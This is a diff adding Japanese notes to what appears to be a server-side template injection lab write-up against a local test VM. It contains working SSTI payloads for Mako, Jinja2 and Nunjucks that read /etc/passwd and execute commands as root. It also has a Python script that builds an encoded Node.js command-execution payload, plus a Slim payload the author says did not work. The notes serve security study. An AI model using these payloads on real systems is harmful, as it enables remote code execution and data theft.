@@ -479,6 +479,11 @@ pueqjbpv{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}z
 http://192.168.99.100:15001/reflect/mako?inj=${engine}
 Internal Server Error
 ```
+以下でRCEできた！   
+```txt
+/reflect/mako?inj=${__import__(%22subprocess%22).check_output(%22id%22)}
+gwxcpnysuid=0(root) gid=0(root) groups=0(root) sfondqyc
+```
 #### jinja2
 ```python
     elif engine == 'jinja2':
@@ -504,6 +509,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 ```txt
 http://192.168.99.100:15001/reflect/jinja2?inj={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
 kumvedgwroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync......
+```
+以下でRCEできた！   
+```txt
+/reflect/jinja2?inj={{"".__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.items()[13][1]["__import__"]("subprocess").check_output("id")}}
+egaepbsquid=0(root) gid=0(root) groups=0(root) ipsfpzzk
 ```
 #### tornado
 ```python
@@ -614,6 +624,13 @@ http://192.168.99.100:15005/reflect/slim?inj=%23{Dir.entries(%27/%27)}
 Slim::Parser::SyntaxError at /reflect/slim
 Expected attribute (__TEMPLATE__), Line 1, Column 2 #{Dir.entries('/')} ^ 
 ```
+https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/ruby/Slim/exploit.py   
+によれば以下で行けるらしいけどInternal server errorがでてうまく行ってない…   
+```python
+#this exploit returns true if successful
+payload='#{system( "touch attackerFile" )}'
+payload='#{%x( ls )}'
+```
 #### erb
 ```ruby
         when "erb"
@@ -708,6 +725,32 @@ app.use('/nunjucks', function(req, res){
 ```txt
 http://192.168.99.100:15004/nunjucks?inj=***
 TEDkpYm4gpNPPsw3mspMMDxnAMePvcSD***oPMmVEt3Hhwv7cz30d8cpdXdhrvdMD4o
+```
+以下のpython2スクリプトで`id`コマンドを実行できるRCE！   
+```python
+import base64
+
+command_to_execute = "id"
+code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
+code_b64_Encoded =base64.b64encode( code_to_execute )
+jscode = '''range.constructor("return eval(Buffer('%s','base64').toString())")()'''%code_b64_Encoded
+payload ='''{{%s}}'''%jscode
+
+# /nunjucks?inj={{range.constructor("return eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJykudG9TdHJpbmcoKQ==','base64').toString())")()}}
+# kktOA7zUUCZz6Jhf7k8abZ0kC6sGTXwpuid=0(root) gid=0(root) groups=0(root)
+# E90XejidKrwlbKKmNTWVQV4Zb2RvNpmK
+```
+以下でも可！   
+```python
+jscode = "global.process.mainModule.require('child_process').execSync('ls').toString()"
+#jscode = "require('child_process').execSync('ls').toString()" dont have require
+#jscode = "require('child_process')"
+#jscode = "1+1"
+payload ='''{{range.constructor("return eval(\\"%s\\")")()}}'''%jscode
+
+# /nunjucks?inj={{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('id').toString()\")")()}}
+# WWKzsJvlaipkYpcwCFOPawDLcHtpcAhIuid=0(root) gid=0(root) groups=0(root)
+# xgstTXsVI3B8BeMdhG6oSb6cCozyD7UQ
 ```
 #### javascript (eval)
 ```js
